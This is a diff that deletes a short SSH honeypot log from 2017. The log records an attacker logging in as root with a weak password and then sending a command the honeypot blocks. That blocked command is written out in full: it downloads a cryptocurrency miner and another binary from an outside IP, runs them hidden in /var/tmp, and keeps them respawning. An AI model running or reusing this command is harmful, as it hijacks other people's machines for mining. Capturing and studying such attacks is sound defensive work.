@@ -1,8 +1,0 @@
-20170401_035315_202043 - [POT  ] network1 - 192.168.5.2:22
-20170401_035315_202043 - [SSH  ] Incoming Connection from 136.144.130.188:48459 - United States
-20170401_035315_577883 - [SSH  ] Login Successful: root:123456
-20170401_035315_577883 - [SSH  ] Login was spoofed
-20170401_035315_887816 - [EXEC0] Opened Channel
-20170401_035315_964508 - [EXEC0] Command Blocked: unset plm; plm=`ps x |grep stratum|grep -v grep| cut -d 's' -f 2`; if [ -e $plm ] ; then mkdir /var/tmp/.war;wget http://95.128.182.166/javascripts/minerd -O /var/tmp/.war/1;curl -o /var/tmp/.war/1 http://95.128.182.166/javascripts/minerd;chmod +x /var/tmp/.war/1 ; (exec /var/tmp/.war/1 -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u zaxa2aq@protonmail.com -p x &> /dev/null &);wget http://95.128.182.166/javascripts/4 -O /var/tmp/.war/4;curl -o /var/tmp/.war/4 http://95.128.182.166/javascripts/4;chmod +x /var/tmp/.war/4; cp /var/tmp/.war/4 /var/tmp/.war/6;(exec /var/tmp/.war/4 &> /dev/null &) ; (while [ 1 ]; do killall 4; killall 5 ; cp /var/tmp/.war/6 /var/tmp/.war/5;chmod +x /var/tmp/.war/5;(exec /var/tmp/.war/5 &> /dev/null &); sleep 3600 ;done &) ; else echo; fi;
-20170401_035316_423910 - [EXEC0] Closed Channel
-20170401_035316_620645 - [SSH  ] Lost Connection with 136.144.130.188
